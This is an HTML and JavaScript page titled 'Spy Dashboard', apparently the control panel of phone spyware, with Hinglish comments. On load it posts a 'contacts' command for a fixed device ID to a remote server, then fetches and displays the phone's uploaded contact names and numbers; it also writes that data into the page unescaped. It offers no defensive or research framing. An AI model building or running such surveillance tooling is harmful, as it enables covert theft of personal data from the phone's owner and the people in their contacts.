<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contacts - Spy Dashboard</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --bg-color: #0f0f0f; --text-main: #ffffff; --accent: #4caf50; }
        body { background-color: var(--bg-color); color: var(--text-main); font-family: sans-serif; padding: 20px; }
        .container { max-width: 450px; margin: auto; }
        .header { display: flex; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 15px; }
        .back-btn { color: white; margin-right: 15px; font-size: 1.2rem; }
        .contact-card { background: #1a1a1a; padding: 15px; border-radius: 10px; margin-bottom: 10px; display: flex; align-items: center; border: 1px solid #333; }
        .avatar { width: 40px; height: 40px; background: var(--accent); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-weight: bold; }
        .info { flex: 1; }
        .name { font-weight: bold; }
        .number { color: #aaa; font-size: 0.9rem; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
            <h2>Contacts List</h2>
        </div>

        <div id="contactsContainer">
            <div style="text-align: center; color: #666; margin-top: 50px;">
                <i class="fas fa-spinner fa-spin"></i> Loading...
            </div>
        </div>
    </div>

    <script>
        // ⚠️ SABSE IMPORTANT CHANGE YAHAN HAI:
        const RENDER_URL = "https://child-v9no.onrender.com"; 
        const DEVICE_ID = "M2103K19I"; // <-- Yahan maine naam sahi kar diya hai

        // Step 1: Pehle Command bhejo ki contacts upload kare
        async function loadContacts() {
            const container = document.getElementById("contactsContainer");
            
            try {
                // Command Bhejo
                console.log("Sending command to phone...");
                await fetch(`${RENDER_URL}/api/send-command`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
                });

                // Thoda wait karo taaki phone upload kar sake (3 seconds)
                container.innerHTML = "<div style='text-align:center'>Command sent. Waiting for phone to upload...</div>";
                setTimeout(fetchData, 4000); 

            } catch (err) {
                console.error(err);
                container.innerHTML = "Error connecting to server.";
            }
        }

        // Step 2: Data Fetch karo
        async function fetchData() {
            const container = document.getElementById("contactsContainer");
            try {
                // Log ke hisaab se tumhara server shayad is naam se file save kar raha hai:
                // M2103K19I_contacts.json
                // Isliye hum server se data mangenge:
                
                const response = await fetch(`${RENDER_URL}/api/get-data/${DEVICE_ID}/contacts`);
                const data = await response.json();

                container.innerHTML = ""; 

                if(!data || data.length === 0) {
                    container.innerHTML = "<div style='text-align:center'>No contacts found. Try refreshing in 10 seconds.</div>";
                    return;
                }

                data.forEach(contact => {
                    const initial = contact.name ? contact.name.charAt(0).toUpperCase() : "?";
                    const card = `
                        <div class="contact-card">
                            <div class="avatar">${initial}</div>
                            <div class="info">
                                <div class="name">${contact.name || "Unknown"}</div>
                                <div class="number">${contact.number || "No Number"}</div>
                            </div>
                            <i class="fa-solid fa-phone" style="color: #4caf50;"></i>
                        </div>
                    `;
                    container.innerHTML += card;
                });
            } catch (err) {
                console.log(err);
                container.innerHTML = "<div style='text-align:center; color:#ff4444'>Data not received yet. <br> <button onclick='location.reload()' style='margin-top:10px; padding:5px 10px;'>Try Again</button></div>";
            }
        }

        // Page khulte hi shuru karo
        window.onload = loadContacts;
    </script>
</body>
</html>
